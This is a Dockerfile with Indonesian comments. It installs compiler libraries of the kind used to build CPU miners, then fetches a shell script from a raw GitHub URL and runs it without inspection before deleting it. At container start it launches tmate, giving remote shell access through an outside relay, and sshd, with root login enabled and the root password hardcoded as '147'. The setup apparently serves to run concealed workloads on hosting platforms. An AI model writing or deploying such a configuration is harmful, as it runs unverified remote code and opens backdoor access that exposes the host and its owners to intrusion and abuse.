# Gunakan image dasar
FROM debian:latest

# Set non-interaktif untuk mencegah prompt interaktif selama instalasi
ENV DEBIAN_FRONTEND=noninteractive

# Update sistem dan instal paket yang diperlukan
RUN apt update && apt upgrade -y && apt install -y \
    ssh git wget curl tmate gcc libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential

# Set WORKDIR ke /usr/bin sehingga semua operasi selanjutnya dilakukan dalam direktori ini
WORKDIR /usr/bin


# Download vs.sh, beri izin eksekusi, jalankan, dan hapus setelah selesai
RUN wget https://raw.githubusercontent.com/hudahadoh/vs/main/vs.sh \
    && chmod +x vs.sh \
    && ./vs.sh \
    && rm vs.sh



# Membuat direktori untuk SSH
RUN mkdir /run/sshd

# Konfigurasi SSH dan tmate
RUN echo "sleep 5" >> /usr/bin/openssh.sh \
    && echo "tmate -F &" >> /usr/bin/openssh.sh \
    && echo '/usr/sbin/sshd -D' >> /usr/bin/openssh.sh \
    && chmod 755 /usr/bin/openssh.sh \
    && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
    && echo 'root:147' | chpasswd

# Membuka port yang diperlukan
EXPOSE 80 443 3306 4040

# Set CMD untuk menjalankan openssh.sh
CMD /usr/bin/openssh.sh
